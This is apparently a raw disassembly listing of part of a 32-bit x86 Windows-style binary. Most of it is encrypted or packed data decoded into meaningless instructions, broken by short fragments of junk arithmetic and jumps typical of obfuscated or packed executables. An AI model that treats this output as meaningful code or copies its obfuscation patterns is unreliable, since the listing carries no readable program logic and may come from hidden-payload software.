  406240:	xchg   ebx,eax
  406241:	push   ebp
  406242:	stc    
  406243:	sbb    ebp,ecx
  406245:	jne    0x4061db
  406247:	or     al,0x85
  406249:	call   0xba51d252
  40624e:	pop    ebx
  40624f:	(bad)  
  406250:	jmp    0xaae35f47
  406255:	mov    edx,ecx
  406257:	enter  0xd1cd,0x8a
  40625b:	mov    ch,0x3d
  40625d:	xchg   esi,eax
  40625e:	cmp    al,0x69
  406260:	ins    DWORD PTR es:[edi],dx
  406261:	jge    0x4062ce
  406263:	addr16 das 
  406265:	stc    
  406266:	xchg   ebp,eax
  406267:	das    
  406268:	(bad)  
  406269:	(bad)  
  40626b:	push   ebp
  40626c:	retf   0x5007
  40626f:	in     al,dx
  406270:	push   edx
  406271:	cld    
  406272:	outs   dx,BYTE PTR ds:[esi]
  406273:	push   ds
  406274:	xchg   edx,eax
  406275:	pop    eax
  406276:	xchg   ebx,eax
  406277:	mov    dh,0x73
  406279:	in     al,0x66
  40627b:	int    0x48
  40627d:	dec    edx
  40627e:	aaa    
  40627f:	dec    ebp
  406280:	test   eax,0xb943815f
  406285:	pop    ebp
  406286:	call   FWORD PTR [eax+0x45]
  406289:	pop    ecx
  40628a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628b:	call   0x8b18:0x458b744c
  406292:	jne    0x4062a4
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	pop    ebx
  40632f:	(bad)  
  406330:	aaa    
  406331:	pop    esp
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406318
  40633b:	dec    ebx
  40633c:	and    al,0xe7
  40633e:	mov    eax,0xe95e8336
  406343:	add    al,0x22
  406345:	fild   QWORD PTR [ecx+0x68175685]
  40634b:	clc    
  40634c:	ins    BYTE PTR es:[edi],dx
  40634d:	mov    dl,0xb9
  40634f:	div    BYTE PTR [edi+ebp*4]
  406352:	fild   DWORD PTR [edx+0x44328403]
  406358:	jnp    0x40631f
  40635a:	pop    ebx
  40635b:	adc    al,0x95
  40635d:	in     al,0x98
  40635f:	and    BYTE PTR [eax-0x3d5dd872],dl
  406365:	ins    DWORD PTR es:[edi],dx
  406366:	mov    ds:0xe5767203,al
  40636b:	scas   eax,DWORD PTR es:[edi]
  40636c:	inc    ebx
  40636d:	xchg   BYTE PTR [edi],ah
  40636f:	xor    al,0xae
  406371:	xchg   ebp,eax
  406372:	mov    eax,0x37460d39
  406377:	ins    BYTE PTR es:[edi],dx
  406378:	jle    0x406365
  40637a:	les    eax,FWORD PTR [ecx+0x46592dda]
  406380:	mov    ebp,0x6c65891e
  406385:	(bad)  
  406386:	xchg   esi,eax
  406387:	shr    ecx,0xd
  40638a:	jo     0x406331
  40638c:	mov    esp,0x3b3c9bb
  406391:	cmp    DWORD PTR [eax+0xe],edi
  406394:	xchg   edi,eax
  406395:	xchg   esp,eax
  406396:	daa    
  406397:	push   ds
  406398:	(bad)  
  406399:	jmp    0x1f891672
  40639e:	inc    ebp
  40639f:	adc    edx,DWORD PTR [edi*1-0x238a47a2]
  4063a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a7:	daa    
  4063a8:	scas   al,BYTE PTR es:[edi]
  4063a9:	jle    0x4063bc
  4063ab:	mov    bl,BYTE PTR [esi]
  4063ad:	and    bh,ah
  4063af:	sbb    DWORD PTR [ebp+0x12],esp
  4063b2:	adc    DWORD PTR [ecx-0x6564e071],esp
  4063b8:	call   0x85b9:0x2bfbc201
  4063bf:	stc    
  4063c0:	aaa    
  4063c1:	sub    DWORD PTR [eax],ebx
  4063c3:	add    eax,0xe1fd4c87
  4063c8:	fs ss sub al,0x7
  4063cc:	push   cs
  4063cd:	je     0x4063e4
  4063cf:	adc    BYTE PTR [esi],0x46
  4063d2:	ins    BYTE PTR es:[edi],dx
  4063d3:	int3   
  4063d4:	push   ecx
  4063d5:	inc    ebx
  4063d6:	daa    
  4063d7:	in     eax,0xd5
  4063d9:	inc    ecx
  4063da:	push   esi
  4063db:	push   esi
  4063dc:	js     0x40641c
  4063de:	ds retf 
  4063e0:	dec    eax
  4063e1:	das    
  4063e2:	retf   0x4d5a
  4063e5:	cwde   
  4063e6:	mov    es,WORD PTR [ecx+ecx*1+0x472137bd]
  4063ed:	out    dx,al
  4063ee:	ret    0x76bc
  4063f1:	pop    ecx
  4063f2:	mov    cl,0x47
  4063f4:	outs   dx,DWORD PTR ds:[esi]
  4063f5:	retf   
  4063f6:	xchg   esp,eax
  4063f7:	out    0xcf,eax
  4063f9:	dec    eax
  4063fa:	mov    ch,0x77
  4063fc:	imul   ebx,DWORD PTR [eax],0xffffffe3
  4063ff:	adc    edx,DWORD PTR [edx+0x68]
  406402:	imul   eax,DWORD PTR [ecx+0x17],0xffffff91
  406406:	fst    DWORD PTR [ecx+0x7c]
  406409:	add    ebx,DWORD PTR [ecx+0x7e4a2a41]
  40640f:	mov    dh,0xcb
  406412:	dec    esi
  406413:	scas   al,BYTE PTR es:[edi]
  406414:	jl     0x40646d
  406416:	xor    al,0x6d
  406418:	inc    ecx
  406419:	in     al,dx
  40641a:	push   0xffffff9e
  40641c:	add    BYTE PTR [ebp-0xfbb3868],bh
  406422:	scas   al,BYTE PTR es:[edi]
  406423:	jo     0x4063a7
  406425:	xor    dl,cl
  406427:	add    DWORD PTR [eax],0xe3b88ae8
  40642d:	mov    edi,esi
  40642f:	ja     0x40642a
  406431:	mov    ?,ebx
  406433:	pop    edx
  406434:	fs mov bh,0x68
  406437:	push   ebx
  406438:	es push 0x24
  40643b:	mov    ds:0x3e2d19d1,eax
  406440:	int3   
  406441:	test   DWORD PTR ss:[edi-0x1e],0x573128f0
  406449:	pop    ebx
  40644a:	push   ss
  40644b:	or     bl,dh
  40644d:	retf   
  40644e:	and    ebx,DWORD PTR [esi+0x3f715d04]
  406454:	push   0xd5f8d0af
  406459:	hlt    
  40645a:	pop    ecx
  40645b:	call   0x5f23:0xaecb5fa3
  406462:	aaa    
  406463:	xchg   ecx,eax
  406464:	ret    0xb45a
  406467:	inc    eax
  406468:	mov    ebp,0xd010891f
  40646d:	ds aam 0xd1
  406470:	jl     0x406491
  406472:	test   ebp,0x6167d7e2
  406478:	adc    bl,0x80
  40647b:	pop    ss
  40647c:	xor    DWORD PTR [edi+edi*1+0x18b3a32f],0x71
  406484:	stc    
  406485:	cmc    
  406486:	xor    al,0xaa
  406488:	cdq    
  406489:	jmp    0x1d26:0x77dbf3
  406490:	dec    edx
  406491:	jp     0x4064b1
  406493:	test   al,0x95
  406496:	adc    cl,BYTE PTR [esp+edx*1]
  406499:	pop    edx
  40649a:	jbe    0x406460
  40649c:	add    BYTE PTR [edx],dl
  40649e:	sbb    al,0x81
  4064a0:	sbb    BYTE PTR [ebx],0xd9
  4064a3:	mov    ds:0xd596e7a6,eax
  4064a8:	fcmove st,st(3)
  4064aa:	jmp    0x4064e1
  4064ac:	fsub   DWORD PTR [eax+0x31]
  4064af:	(bad)  
  4064b0:	stos   BYTE PTR es:[edi],al
  4064b1:	popa   
  4064b2:	inc    ebp
  4064b3:	add    esp,DWORD PTR [edx]
  4064b5:	mov    edi,0xbe5edb1a
  4064ba:	xor    eax,DWORD PTR ds:0xdfdf290c
  4064c0:	jo     0x4064a4
  4064c2:	das    
  4064c3:	jb     0x406457
  4064c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064c6:	xor    dh,BYTE PTR [eax]
  4064c8:	sahf   
  4064c9:	xchg   esp,eax
  4064ca:	push   ss
  4064cb:	pushf  
  4064cc:	sbb    BYTE PTR [eax-0x2e],al
  4064cf:	xlat   BYTE PTR ds:[ebx]
  4064d0:	shl    dh,1
  4064d2:	and    eax,0x697f0ff6
  4064d7:	outs   dx,DWORD PTR ds:[esi]
  4064d8:	mov    ds:0x9b9408cf,eax
  4064dd:	les    ebp,FWORD PTR [ebp-0x7bc4bad3]
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	popf   
  406567:	addr16 cwde 
  406569:	mov    al,ds:0x70703a33
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	cmp    ecx,DWORD PTR [ecx-0x66]
  406575:	enter  0x58b9,0xdf
  406579:	arpl   WORD PTR [edi],sp
  40657b:	sbb    edi,ebp
  40657d:	mov    bl,0x1
  40657f:	ucomiss xmm2,DWORD PTR [ebp+0x57]
  406583:	bound  ecx,QWORD PTR [esi-0x7dedaa99]
  406589:	fdivr  QWORD PTR [edx]
  40658b:	jle    0x40656b
  40658d:	sbb    dh,BYTE PTR [ecx]
  40658f:	cmp    BYTE PTR [edx-0x6],dl
  406592:	push   esp
  406593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406594:	mov    BYTE PTR [ecx-0x1d],dh
  406597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406598:	retf   0x194c
  40659b:	pop    edx
  40659c:	xchg   ebx,eax
  40659d:	pop    ebx
  40659e:	fs es ins BYTE PTR es:[edi],dx
  4065a1:	popa   
  4065a2:	jmp    DWORD PTR cs:[edi]
  4065a5:	adc    ecx,DWORD PTR [edx+0x2daa427a]
  4065ab:	sub    eax,ebp
  4065ad:	loope  0x406574
  4065af:	imul   ah
  4065b1:	pop    edi
  4065b2:	fldcw  WORD PTR [edi]
  4065b4:	dec    esp
  4065b5:	adc    eax,0x81c4a30
  4065ba:	js     0x40657c
  4065bc:	xchg   edx,eax
  4065bd:	mov    BYTE PTR [eax+edi*8-0x10],ah
  4065c1:	sub    al,0x97
  4065c3:	mov    esp,0xf195e92a
  4065c8:	repnz xor cl,cl
  4065cb:	cmp    al,0x7c
  4065cd:	add    ebp,eax
  4065cf:	lods   eax,DWORD PTR ds:[esi]
  4065d0:	(bad)  
  4065d1:	xchg   ecx,eax
  4065d2:	jae    0x40661e
  4065d4:	sub    al,0x7a
  4065d6:	add    bh,BYTE PTR [eax-0x17]
  4065d9:	cmp    eax,0xb71cb923
  4065de:	sub    dh,dh
  4065e0:	pushf  
  4065e1:	pop    edx
  4065e2:	jns    0x4065df
  4065e4:	jb     0x40660e
  4065e6:	adc    DWORD PTR [edi+0x1d],edx
  4065e9:	out    0x2f,al
  4065eb:	dec    ebp
  4065ec:	push   ss
  4065ed:	jo     0x40659a
  4065ef:	inc    eax
  4065f0:	mov    gs,WORD PTR [esp+ebx*8+0x2be3c90c]
  4065f7:	stos   BYTE PTR es:[edi],al
  4065f8:	ds jmp 0xc5c467dc
  4065fe:	in     eax,dx
  4065ff:	ret    0xd010
  406602:	jp     0x40659c
  406604:	ret    0xddf5
  406607:	dec    edi
  406608:	ret    0x1118
  40660b:	popa   
  40660c:	std    
  40660d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660e:	mov    BYTE PTR [ecx-0x7ae58afc],dh
  406614:	into   
  406615:	adc    eax,0xe6b8a4f5
  40661a:	xor    al,0x63
  40661c:	fstp   TBYTE PTR [ebp-0x240ac3db]
  406622:	jnp    0x40665d
  406624:	les    ebx,FWORD PTR [ebx+0x4aae0e51]
  40662a:	or     DWORD PTR [edx],edx
  40662c:	pop    ebx
  40662d:	ret    
  40662e:	scas   eax,DWORD PTR es:[edi]
  40662f:	xor    al,0x68
  406631:	mov    edi,DWORD PTR [edi]
  406633:	popa   
  406634:	ds in  eax,dx
  406636:	push   esp
  406637:	jno    0x40668e
  406639:	sub    al,0xf9
  40663b:	mov    ebp,0x4c172cbc
  406640:	pop    es
  406641:	xchg   DWORD PTR [ebp+ebx*8+0x64],esi
  406645:	jle    0x406606
  406647:	cmp    ecx,0xffffffa0
  40664a:	add    eax,0x30788b
  40664f:	push   ds
  406650:	or     al,0xb2
  406652:	mov    ecx,0x20da234a
  406657:	ss test al,0xae
  40665a:	ret    0x6bda
  40665d:	mov    esi,0x6648e6af
  406662:	pop    es
  406663:	mov    esp,0xf0dc84ad
  406668:	hlt    
  406669:	pop    ds
  40666a:	fisubr DWORD PTR [esi-0x4aa5608d]
  406670:	enter  0x686a,0x32
  406674:	stos   BYTE PTR es:[edi],al
  406675:	stos   DWORD PTR es:[edi],eax
  406676:	or     ecx,DWORD PTR [eax]
  406678:	inc    ebx
  406679:	and    bh,BYTE PTR [esi+edx*8-0x43558aa8]
  406680:	mov    WORD PTR [ebx-0x6ee7f8e0],?
  406686:	inc    ecx
  406687:	bnd ret 
  406689:	pop    es
  40668a:	rcl    DWORD PTR [ebx+0x54],0xbd
  40668e:	pop    esi
  40668f:	es mov edx,0xb4a77df5
  406695:	sub    DWORD PTR [ebx-0x18],eax
  406698:	dec    edi
  406699:	mov    esp,0x5ab94f2c
  40669e:	iret   
  40669f:	dec    ecx
  4066a0:	sub    edx,DWORD PTR [esi+0x69b2b1b8]
  4066a6:	rol    DWORD PTR [ebp+0x38],cl
  4066a9:	jl     0x4066ad
  4066ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066ac:	add    DWORD PTR [esi],eax
  4066ae:	sbb    edi,DWORD PTR [eax-0x55]
  4066b1:	jb     0x406693
  4066b3:	pop    ecx
  4066b4:	fmul   DWORD PTR [edi+esi*8-0x58]
  4066b8:	fwait
  4066b9:	mov    al,dh
  4066bb:	mov    bh,BYTE PTR [esi+0x1]
  4066be:	or     al,0x9c
  4066c0:	mov    bl,0xfd
  4066c2:	dec    edi
  4066c3:	shl    BYTE PTR [ebx+edi*8-0x73fab8d3],cl
  4066ca:	mov    edi,0x2c478db4
  4066cf:	add    DWORD PTR [esi],0xc75f758a
  4066d5:	sbb    edx,DWORD PTR ds:0x1a4ed2b7
  4066db:	sbb    ebx,ebx
  4066dd:	fcmovne st,st(5)
  4066df:	ret    
  4066e0:	test   al,0x91
  4066e2:	sbb    BYTE PTR [esi],ah
  4066e4:	repz add ebp,ebx
  4066e7:	je     0x406767
  4066e9:	aam    0xbf
  4066eb:	icebp  
  4066ec:	mov    eax,0x3dc6d8bb
  4066f1:	and    ecx,DWORD PTR [ebx+0x6b0407f]
  4066f7:	(bad)  
  4066f8:	dec    edx
  4066f9:	int3   
  4066fa:	sub    dh,BYTE PTR [eax]
  4066fc:	cmp    al,BYTE PTR [ebx]
  4066fe:	dec    eax
  4066ff:	loopne 0x406713
  406701:	sti    
  406702:	mov    dh,0x11
  406704:	dec    ebx
  406705:	mov    gs,WORD PTR [ecx-0x70]
  406708:	rcr    BYTE PTR [edi],0x21
  40670b:	xchg   ecx,eax
  40670c:	cmp    bh,BYTE PTR [edx]
  40670e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40670f:	dec    edx
  406710:	fwait
  406711:	cli    
  406712:	pop    ebx
  406713:	loope  0x406704
  406715:	outs   dx,DWORD PTR ds:[esi]
  406716:	or     al,0xe2
  406718:	adc    esi,DWORD PTR [edx]
  40671a:	adc    BYTE PTR [ecx+0x3a],cl
  40671d:	pop    eax
  40671e:	fiadd  WORD PTR [ebp-0x668f418f]
  406724:	push   cs
  406725:	push   0x1384bb47
  40672a:	and    BYTE PTR [edi-0x13],bl
  40672d:	fisub  WORD PTR [edi+0x4fd26ada]
  406733:	mov    cl,0x7a
  406735:	and    DWORD PTR [eax+0x21ef9eb1],0x2f
  40673c:	push   edi
  40673d:	or     dl,BYTE PTR [edx+0xd]
  406740:	mov    cl,0x5e
  406742:	cwde   
  406743:	lods   eax,DWORD PTR ds:[esi]
  406744:	test   eax,0xc55ca27d
  406749:	and    eax,0xdd3367d5
  40674e:	ins    DWORD PTR es:[edi],dx
  40674f:	into   
  406750:	in     al,dx
  406751:	mul    bl
  406753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406754:	scas   eax,DWORD PTR es:[edi]
  406755:	mov    DWORD PTR [ecx],ebx
  406757:	pop    ebp
  406758:	adc    bh,dh
  40675a:	or     bl,al
  40675c:	sar    BYTE PTR [ebx],1
  40675e:	popf   
  40675f:	repnz leave 
  406761:	inc    ecx
  406762:	adc    eax,0x9dccdde6
  406767:	push   es
  406768:	cmovnp eax,edx
  40676b:	inc    ebx
  40676c:	xchg   edi,eax
  40676d:	int    0xaf
  40676f:	mov    ah,0x78
  406771:	mov    bl,0x7a
  406773:	(bad)  
  406774:	repnz daa 
  406776:	retf   
  406777:	dec    edi
  406778:	pop    esp
  406779:	es ret 0x9151
  40677d:	mov    bl,0xdb
  40677f:	mov    ecx,0xe0a5077b
  406784:	and    ah,ch
  406786:	xor    BYTE PTR [edx+edi*4-0x210ff62b],cl
  40678d:	das    
  40678e:	cli    
  40678f:	das    
  406790:	arpl   WORD PTR [ebp-0x7e],cx
  406793:	jns    0x4067af
  406795:	cwde   
  406796:	sbb    edi,edx
  406798:	scas   eax,DWORD PTR es:[edi]
  406799:	jo     0x4067ae
  40679b:	xchg   DWORD PTR [ebp+ebp*1-0x50],ecx
  40679f:	mov    eax,0xb0df72e3
  4067a4:	(bad)
  4067a8:	int3   
  4067a9:	push   eax
  4067aa:	mov    ds:0x840e135a,eax
  4067af:	or     eax,0x9c68891
  4067b4:	push   0xffffffd3
  4067b6:	cmp    esp,DWORD PTR [ebx]
  4067b8:	inc    esi
  4067b9:	in     al,0x27
  4067bb:	adc    cl,BYTE PTR [ebx+0x70]
  4067be:	mov    cl,0x25
  4067c0:	push   es
  4067c1:	and    BYTE PTR cs:[eax],al
  4067c4:	inc    ebx
  4067c5:	jecxz  0x4067d5
  4067c7:	jnp    0x406816
  4067c9:	lea    ecx,[ebp-0x216ae223]
  4067cf:	test   eax,0x33dd5707
  4067d4:	iret   
  4067d5:	outs   dx,BYTE PTR ds:[esi]
  4067d6:	into   
  4067d7:	mov    bl,BYTE PTR [ecx-0x7]
  4067da:	sbb    eax,0x2b6bb21a
  4067df:	hlt    
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	loope  0x406811
  406848:	pushf  
  406849:	xchg   ecx,eax
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	aas    
  406853:	dec    esp
  406854:	test   DWORD PTR [eax],eax
  406856:	jnp    0x4067fc
  406858:	fisubr WORD PTR [eax]
  40685a:	into   
  40685b:	dec    ecx
  40685c:	imul   esi,DWORD PTR [edi],0xffffffae
  40685f:	ret    0x7b88
  406862:	inc    ecx
  406863:	shl    BYTE PTR [esi-0x73],1
  406866:	repz add dh,ch
  406869:	fcom   DWORD PTR [edi-0x1b]
  40686c:	dec    edi
  40686d:	out    dx,eax
  40686e:	cwde   
  40686f:	rcr    ecx,1
  406871:	push   esi
  406872:	xchg   ebp,eax
  406873:	sub    eax,0xb8ce1521
  406878:	ret    0x928d
  40687b:	ret    
  40687c:	mov    ecx,0xc251af7b
  406881:	out    dx,al
  406882:	adc    cl,BYTE PTR [ecx-0x73e5295e]
  406888:	test   DWORD PTR [edi],ebx
  40688a:	or     ch,BYTE PTR [edx]
  40688c:	pop    esp
  40688d:	xor    al,0xf4
  40688f:	ret    
  406890:	xor    DWORD PTR [ebx],0x39
  406893:	lods   al,BYTE PTR ds:[esi]
  406894:	je     0x406832
  406896:	and    ebp,DWORD PTR [ecx]
  406898:	loopne 0x406861
  40689a:	test   eax,0x28830bc0
  40689f:	or     eax,0x1d5e8d16
  4068a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a6:	rcr    BYTE PTR [ebx+eax*8],1
  4068a9:	push   esi
  4068aa:	add    dl,0xe8
  4068ad:	rol    al,cl
  4068af:	stos   DWORD PTR es:[edi],eax
  4068b0:	aaa    
  4068b1:	sub    eax,ecx
  4068b3:	inc    esp
  4068b4:	and    eax,0xde0533fd
  4068b9:	adc    DWORD PTR [esi-0x5cef27d0],esi
  4068bf:	adc    eax,DWORD PTR [ecx-0x4b10af6a]
  4068c5:	hlt    
  4068c6:	test   DWORD PTR [eax-0x3],0x1f267154
  4068cd:	adc    ah,bl
  4068cf:	sbb    BYTE PTR [ecx+0x1a],ch
  4068d2:	rcl    BYTE PTR [eax-0x5f],0x8b
  4068d6:	add    al,bl
  4068d8:	mov    edi,0x5558c946
  4068dd:	setp   bh
  4068e0:	out    dx,al
  4068e1:	fmul   DWORD PTR [ecx+ebx*8+0x56204f90]
  4068e8:	mov    al,BYTE PTR [edx-0x14ad764e]
  4068ee:	test   BYTE PTR [ecx],0x3
  4068f1:	ja     0x4068b4
  4068f3:	push   es
  4068f4:	ins    DWORD PTR es:[edi],dx
  4068f5:	jnp    0x4068b5
  4068f7:	ret    0x8631
  4068fa:	dec    cx
  4068fc:	repz bound eax,QWORD PTR [eax-0x589d9686]
  406903:	dec    bp
  406905:	sbb    esp,edi
  406907:	rcr    ch,cl
  406909:	sbb    esp,ebp
  40690b:	xor    bl,ch
  40690d:	push   edx
  40690e:	jns    0x406937
  406910:	test   eax,0x6cba550a
  406915:	sbb    ebp,ebp
  406917:	mov    ecx,0x8c28ac48
  40691c:	cmp    DWORD PTR [ebx+eiz*4-0xefaf2e4],esp
  406923:	aas    
  406924:	enter  0x88cf,0x91
  406928:	mov    dl,0x7c
  40692a:	mov    ?,WORD PTR [ebx-0x67]
  40692d:	mov    ds:0xcc1ef3b3,eax
  406932:	mov    edi,0x905f0d67
  406937:	jle    0x40692c
  406939:	push   cs
  40693a:	sbb    dl,ah
  40693c:	xor    edi,ebp
  40693e:	xor    al,0x9f
  406940:	(bad)  
  406941:	loop   0x4069ab
  406943:	cli    
  406944:	adc    DWORD PTR [edi],ebp
  406946:	jp     0x406998
  406948:	sbb    dl,bl
  40694a:	mov    dh,BYTE PTR [edx-0x4b850cc]
  406950:	lock call 0x715696ae
  406956:	test   eax,0xce78e7a3
  40695b:	(bad)
  40695f:	jbe    0x406980
  406961:	scas   eax,DWORD PTR es:[edi]
  406962:	sub    eax,0xaa53d677
  406967:	mov    edi,0xa4934176
  40696c:	and    DWORD PTR [ecx+edi*8],esp
  40696f:	call   0xd987:0x1275e10f
  406976:	dec    ebx
  406977:	mov    eax,0x2359ba24
  40697c:	outs   dx,BYTE PTR ds:[esi]
  40697d:	sahf   
  40697e:	retf   
  40697f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406980:	mov    ebp,0x42411896
  406985:	mov    edx,0x3bba0e28
  40698a:	or     ebp,DWORD PTR [ecx]
  40698c:	xchg   ecx,eax
  40698d:	or     BYTE PTR [eax],cl
  40698f:	sub    BYTE PTR [ebp-0x15],0x8e
  406993:	(bad)  
  406995:	sahf   
  406996:	and    BYTE PTR [ecx],bl
  406998:	sub    al,0x35
  40699a:	sub    DWORD PTR [ecx],ebx
  40699c:	sti    
  40699d:	adc    eax,0x9864d4a2
  4069a2:	push   0xfffffff7
  4069a4:	mov    ch,0x8b
  4069a6:	push   ds
  4069a7:	xor    bl,bl
  4069a9:	outs   dx,BYTE PTR ds:[esi]
  4069aa:	out    0x3b,al
  4069ac:	sar    DWORD PTR [ecx],1
  4069ae:	(bad)  
  4069af:	outs   dx,BYTE PTR ds:[esi]
  4069b0:	pop    esp
  4069b1:	les    ecx,FWORD PTR [ecx]
  4069b3:	cmp    dh,BYTE PTR [esi+0x29]
  4069b6:	and    edi,DWORD PTR [edx+0x37]
  4069b9:	dec    edx
  4069ba:	cmp    ecx,edx
  4069bc:	lods   al,BYTE PTR ds:[esi]
  4069bd:	loop   0x4069b7
  4069bf:	ins    DWORD PTR es:[edi],dx
  4069c0:	mov    al,0x84
  4069c2:	and    al,0x92
  4069c4:	pushf  
  4069c5:	jle    0x4069c3
  4069c7:	dec    eax
  4069c8:	push   edi
  4069c9:	sbb    eax,0x931c6911
  4069ce:	sbb    eax,DWORD PTR [esi]
  4069d0:	stc    
  4069d1:	xchg   esp,eax
  4069d2:	xor    edx,DWORD PTR [edi]
  4069d4:	mov    ds:0x3c039554,al
  4069d9:	lahf   
  4069da:	sbb    BYTE PTR [esi-0x2539f3cf],0xb7
  4069e1:	into   
  4069e2:	sbb    esi,DWORD PTR [ebp-0x45]
  4069e5:	push   ecx
  4069e6:	xchg   ecx,eax
  4069e7:	outs   dx,DWORD PTR ds:[esi]
  4069e8:	mov    al,0x8b
  4069ea:	int3   
  4069eb:	popa   
  4069ec:	outs   dx,BYTE PTR ds:[esi]
  4069ed:	jl     0x406979
  4069ef:	aas    
  4069f0:	ss mov eax,0xf7ac6a47
  4069f6:	and    DWORD PTR [ebp+eiz*2-0x11765027],0xd390b944
  406a01:	mov    ebx,0x9a2d7be5
  406a06:	pop    esi
  406a07:	popa   
  406a08:	test   DWORD PTR [esi-0x69],ecx
  406a0b:	sti    
  406a0c:	pop    DWORD PTR [ebp+0x7d5b15a5]
  406a12:	xchg   edx,eax
  406a13:	clc    
  406a14:	mul    BYTE PTR [eax-0x53]
  406a17:	stos   BYTE PTR es:[edi],al
  406a18:	(bad)
  406a1b:	aam    0xd4
  406a1d:	fisubr WORD PTR [ebx-0x3fd331b6]
  406a23:	add    ch,BYTE PTR [ebp+0x7e267d4e]
  406a29:	(bad)  
  406a2a:	pop    es
  406a2b:	or     DWORD PTR [ecx],eax
  406a2d:	xor    ecx,eax
  406a2f:	push   0x72fdeec4
  406a34:	stos   BYTE PTR es:[edi],al
  406a35:	inc    edi
  406a36:	push   ecx
  406a37:	retf   
  406a38:	ret    
  406a39:	jo     0x406a03
  406a3b:	call   0xa294:0xa38afdca
  406a42:	pop    ebp
